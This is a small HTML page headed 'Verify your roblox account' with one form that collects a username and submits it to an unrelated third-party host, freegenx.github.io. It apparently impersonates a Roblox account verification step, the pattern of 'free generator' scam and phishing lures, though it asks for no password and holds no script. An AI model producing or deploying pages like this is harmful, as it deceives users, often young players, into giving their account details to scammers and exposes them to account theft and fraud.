<!DOCTYPE html>
<html>
<head>
<style>
  body {
    background-color: #4a4a4a;
    font-family: "Roboto", sans-serif;
  }
  h4 {
    color: #fff;
    font-family: "Gotham SSm A", "Gotham SSm B", sans-serif;
    font-weight: 400;
    font-size: 24px;
    margin-top: 0;
    margin-bottom: 20px;
  }
  input[type=text] {
    width: 100%;
    padding: 12px 20px;
    margin: 8px 0;
    box-sizing: border-box;
    border: none;
    border-bottom: 2px solid #4CAF50;
    background-color: #2c2c2c;
    color: #fff;
    font-family: "Roboto", sans-serif;
  }
  input[type=submit] {
    background-color: #4CAF50;
    color: white;
    padding: 14px 20px;
    margin: 8px 0;
    border: none;
    cursor: pointer;
    width: 100%;
    font-family: "Gotham SSm A", "Gotham SSm B", sans-serif;
    font-weight: bold;
    font-size: 16px;
  }
</style>
</head>
<body>

<h4>Verify your roblox account</h4>

<form action="https://freegenx.github.io/verify">
<label for="username">Username:</label><br>
<input type="text" id="username" name="username"><br><br>
<input type="submit" value="Verify">
</form>


</body>
</html>
